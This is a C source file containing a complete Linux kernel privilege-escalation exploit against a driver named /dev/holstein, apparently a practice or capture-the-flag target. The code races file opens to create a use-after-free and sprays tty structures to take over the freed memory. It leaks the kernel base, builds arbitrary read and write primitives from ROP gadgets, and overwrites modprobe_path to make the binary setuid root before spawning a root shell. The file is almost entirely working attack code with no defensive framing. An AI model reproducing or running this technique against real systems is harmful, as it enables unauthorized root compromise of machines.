#define _GNU_SOURCE
#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/syscall.h>
#include <sys/prctl.h>
#include <pthread.h>
#include <sched.h>

#define mov_rax_ptr_rdx (kbase + 0x3c27b9) // mov rax, qword ptr [rdx] ; ret 
#define mov_ptr_rdx_ecx (kbase + 0x109ed) // mov dword ptr [rdx], ecx ; ret
#define modprobe_path (kbase + 0xe384c0)

int fd1, fd2;
long long user_cs, user_rflags, user_rsp, user_ss;
long long kbase, g_buf;
char buf[0x400];

// Wrapper around syscall to get thread id
pid_t gettid(void) {
    return syscall(SYS_gettid);
}

int win = 0;
void* race_fd(void *arg) {
    // Limit thread to one CPU
    cpu_set_t *cpu_set = (cpu_set_t*)arg;
    if (sched_setaffinity(gettid(), sizeof(cpu_set_t), cpu_set)) {
        perror("sched_setaffinity error");
    }

    while (1) {
        while (!win) {
            int fd = open("/dev/holstein", O_RDWR);
            if (fd == fd2) {
                win = 1;
            }
            if (win == 0 && fd == fd1) {
                close(fd);
            }
        }
        // Other thread can still close fd, sanity check
        if (write(fd1, "A", 1) != 1 || write(fd2, "a", 1) != 1) {
            close(fd1);
            close(fd2);
            win = 0;
        } else {
            // All good
            break;
        }
    }
    return NULL;
}

void* spray_thread(void *arg) {
    int x;
    long spray[800];

    // Limit thread to one CPU
    cpu_set_t *cpu_set = (cpu_set_t*)arg;
    if (sched_setaffinity(gettid(), sizeof(cpu_set_t), cpu_set)) {
        perror("sched_setaffinity error");
    }

    for (int i = 0; i < 800; i++) {
        //usleep(10);

        spray[i] = open("/dev/ptmx", O_RDONLY | O_WRONLY);
        // If spray fails close all handles and return
        if (spray[i] == -1) {
            puts("[-] FAIL spray");
            for (int j = 0; j < i; j++) {
                close(spray[j]);
            }
            return (void*)-1;
        }

        // Check if spray hit the UAF area
        if (read(fd2, &x, sizeof(int)) == sizeof(int) && x == 0x5401) {
            printf("[+] Spray hit! x=0x%x\n", x);
            // Close all other handles
            for (int j = 0; j < i; j++) {
                close(spray[j]);
            }
            // Return fd that controls UAF area
            return (void*)spray[i];
        }
    }
    for (int i = 0; i < 800; i++) {
        close(spray[i]);
    }
    puts("[+] Spray did not hit");

    return (void*)-1;
}

int trigger_race_condition_uaf() {
    pthread_t th1, th2;
    long victim_fd = -1;
    int x;

    cpu_set_t t1_cpu, t2_cpu;

    // Create CPU set
    CPU_ZERO(&t1_cpu);
    CPU_ZERO(&t2_cpu);
    CPU_SET(0, &t1_cpu);
    CPU_SET(1, &t2_cpu);

    // Check which fd will be assigned after UAF and assign them automatically
    fd1 = open("/tmp", O_RDONLY);
    fd2 = open("/tmp", O_RDONLY);
    close(fd1);
    close(fd2);
    printf("[+] fd1=%d, fd2=%d\n", fd1, fd2);

    // Race
    pthread_create(&th1, NULL, race_fd, (void*)&t1_cpu);
    pthread_create(&th2, NULL, race_fd, (void*)&t2_cpu);
    pthread_join(th1, NULL);
    pthread_join(th2, NULL);

    // UAF
    close(fd1);

    victim_fd = (long)spray_thread((void*)&t1_cpu);

    while(victim_fd == -1 || x != 0x5401) {
        puts("[+] Spraying on another CPU...");
        pthread_create(&th1, NULL, spray_thread, &t2_cpu);
        pthread_join(th1, (void*)&victim_fd);
        read(fd2, &x, sizeof(int));
    }

    printf("[+] Spray successful! victim_fd=%d\n", (int)victim_fd);
    return victim_fd;
}

long long AAR64(long long addr, int fd) {
    long long* p = (long long*)&buf;

    p[127] = mov_rax_ptr_rdx;
    p[3] = g_buf + 0x3f8 - 12*8;

    write(fd2, buf, 0x400);

    return ioctl(fd, 0, addr);
}

void AAW32(long long addr, unsigned int val, int fd) {
    long long* p = (long long*)&buf;

    p[127] = mov_ptr_rdx_ecx;
    p[3] = g_buf + 0x3f8 - 12*8;

    write(fd2, buf, 0x400);

    ioctl(fd, val, addr);
}

int main(int argc, char **argv) {
    // Too lazy to write separate program to spawn a shell
    if (argc == 2) {
        printf("[+] getuid() returns %d\n", geteuid());
        setuid(0);
        setgid(0);
        system("/bin/sh");
        return 0;
    }

    // Normal exploit path
    int victim_fd = trigger_race_condition_uaf();

    // Leak
    read(fd2, buf, 0x400);
    /*
    for (int i = 0; i < 0x400/8; i++) {
        printf("0x%llx\n", ((long long*)&buf)[i]);
    }
    */

    kbase = ((long long*)&buf)[73] - 0x332da0;
    g_buf = ((long long*)&buf)[7] - 0x38;

    // Sanity check in gdb
    //long long test = 0xcafebabecafebabe;
    //write(fd2, &test, 8);

    printf("[+] leaked kbase = 0x%llx\n", kbase);
    printf("[+] leaked g_buf = 0x%llx\n", g_buf);

    char cmd[] = "/tmp/xx\0";
    AAW32(modprobe_path, *(unsigned int*)&cmd[0], victim_fd);
    AAW32(modprobe_path + 4, *(unsigned int*)&cmd[4], victim_fd);

    puts("[+] Overwrote modprobe_path...");

    system("echo -e \"#!/bin/sh\nchown root:root /exploit\nchmod 4555 /exploit\" > /tmp/xx");
    system("chmod +x /tmp/xx");

    system("echo -e '\xff\xff\xff\xff' > /tmp/a");
    system("chmod +x /tmp/a");

    system("/tmp/a");

    puts("[+] Spawning a shell");
    system("/exploit a");

    return 0;
}